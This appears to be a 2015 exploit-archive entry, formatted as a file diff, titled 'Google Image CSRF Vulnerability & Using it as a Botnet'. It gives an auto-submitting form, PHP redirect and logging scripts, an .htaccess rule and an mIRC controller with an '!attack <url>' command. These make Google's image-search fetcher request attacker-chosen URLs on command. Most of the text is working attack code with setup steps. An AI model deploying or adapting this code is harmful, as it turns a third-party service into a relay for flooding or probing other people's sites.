@@ -1,0 +1,143 @@
+id: 24061
+date: 08/16/2015
+title: Google Image CSRF Vulnerability & Using it as a Botnet
+author: Ashiyane
+cves: 
+
+/***********************************************************************************
+** Exploit Title: Google Image CSRF Vulnerability & Using it as a Botnet
+**
+** Exploit Author: C4T
+**
+** Vendor Homepage : http://images.google.com
+**
+** Google Dork: none
+**
+** Tested on: Linux & Windows
+**
+************************************************************************************
+======================================================
+Google Image Vulnerable Form:
+-------------------------------------------------------
+
+<form method="GET" id="qbf" enctype="multipart/form-data" action="/searchbyimage">
+<div id="qbug"><div class="qbwr"><div class="qbtbha sl">
+<span class="bd qbtbtxt qbclr" id="qbpiu">Paste image URL</span>
+<div id="qbuti" alt="Search help" class="qbh"></div></div>
+<a class="qbtbha qbtbtxt qbclr" href="javascript:void(0)" onclick="google.qb.ti(true);return false">Upload an image</a></div>
+<table class="qbtbp" cellpadding="0" cellspacing="0"><tbody><tr>
+<td style="width: 491px;"><input autocomplete="off" class="lst ktf" aria-labelledby="qbpiu" id="qbui" name="image_url" value="" spellcheck="false"></td>
+<td id="qbbtc"><input class="gbqfb kpbb" name="" value="Search by image" type="submit">
+</td></tr></tbody></table></div><div id="qbig" style="display:none">
+<div class="qbwr"><a class="qbtbtxt qbclr qbtbha" href="javascript:void(0)" onclick="google.qb.ti(false);return false">Paste image URL</a>
+<div class="qbtbha"><div class="qbtbha sl"><span class="bd qbtbtxt qbclr">Upload an image</span>
+<div id="qbfti" alt="Search help" class="qbh"></div></div></div></div>
+<div class="qbtbp" id="qbfilebp"><input id="qbfile" name="encoded_image" style="margin:7px 4px" type="file">
+</div></div><input id="dragi" name="image_content" type="hidden">
+<input id="dragfn" name="filename" type="hidden">
+</form>
+
+# There is no security token , not even a captcha security image.
+=======================================================
+
+Proof:
+Simple Remote Request with Form:
+
+<body onload="document.exploit.submit();">
+<form name="exploit" method="GET" enctype="multipart/form-data" action="https://images.google.com/searchbyimage">
+<input name="image_url" value="[PUT-URL-HERE]">
+</form>
+
+
+Simple Remote Request with URL:
+
+https://images.google.com/searchbyimage?image_url=[PUT-URL-HERE]
+
+
+************
+************ Exploiting it through IRC Servers:
+************
+
+we know CSRF is a Client Side vulnerability and we also know that we can use CSRF in many other attacks
+in this case i want to use CSRF for controlling Google Server as a Zombie
+
+Step 1: Upload callzombie.php & logger.php & .htaccess in your webhost
+Step 2: Save the controller.msl as a single file and load it in mIRC
+step 3: connect to IRC server with another IRC client and join to the channel and Run Commands
+
+
+--------------------------------------------
+callzombie.php
+--------------------------------------------
+<?php
+$request = $_GET['req'];
+file_put_contents("request.txt", $request);
+?>
+--------------------------------------------
+logger.php
+--------------------------------------------
+$zombieserver = $_SERVER[REMOTE_ADDR];
+$file = fopen("request.txt", "r");
+$goto = fread($file, filesize("request.txt"));
+fclose($file);
+file_put_contents("log.txt", $zombieserver."\n" , FILE_APPEND);
+function location($target) {
+header('location: ' . $target);
+}
+location($goto);
+?>
+--------------------------------------------
+.htaccess
+--------------------------------------------
+RewriteEngine on
+RewriteRule ^1.jpg$ logger.php
+--------------------------------------------
+controller.msl
+--------------------------------------------
+/*
+this is a mSL script
+for using this script you should download mIRC from mIRC.com
+load the script by this command: /load -r /path/controller.msl
+after joining clones, you can use this command:
+!attack <url>
+
+example:
+!attack http://somewhere.com/
+*/
+
+on 1:connect:{ join #ashiyane }
+alias CallZombie {
+sockopen CallZombie YourSite.com 80
+}
+on *:sockopen:CallZombie:{
+set %url $+(/directory/callzombie.php,?,req=,%req)
+if ($sockerr) { msg #ashiyane Sock open error. | return }
+sockwrite -n CallZombie GET %url HTTP/1.1
+sockwrite -n CallZombie Host: $sock($sockname).addr
+sockwrite -n CallZombie $str($crlf,2)
+}
+alias GoogleZombie {
+sockopen -e GoogleZombie images.google.com 443
+msg #ashiyane $1 Request Sent.
+}
+on *:sockopen:GoogleZombie:{
+set %url /searchbyimage?image_url=http://yoursite.com/directory/1.jpg
+if ($sockerr) { msg #ashiyane Sock open error. | return }
+sockwrite -n GoogleZombie GET %url HTTP/1.1
+sockwrite -n GoogleZombie Host: $sock($sockname).addr
+sockwrite -n GoogleZombie $str($crlf,2)
+}
+on 1:text:*:*:{
+if (!attack* iswm $$1-) { set %req $2 | sockclose GoogleZombie | sockclose CallZombie | CallZombie $2 | GoogleZombie $2 }
+}
+
+
+
+---------------------------------------------
+simple as that you can controll google server as a zombie via CSRF vulnerability.
+
+---------------------------------------------
+details:
+http://hatrhyme.com/CSRFinGoogle.pdf
+
+#  0day.today [2023-03-24]  #
